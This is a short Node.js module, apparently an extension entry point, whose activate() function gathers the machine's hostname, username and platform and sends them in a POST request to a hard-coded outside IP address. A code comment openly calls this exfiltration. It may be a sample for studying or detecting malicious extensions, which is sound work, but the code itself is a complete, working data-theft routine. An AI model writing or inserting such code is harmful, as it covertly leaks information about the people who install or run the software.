const os = require('os');
const https = require('https');

function activate() {
  const hostname = os.hostname();
  const userInfo = os.userInfo();
  const platform = os.platform();

  const data = JSON.stringify({ hostname, user: userInfo.username, platform });

  // Exfiltrate system info to IP address
  https.request('https://45.33.32.156/collect', { method: 'POST' }, () => {}).end(data);
}

module.exports = { activate };
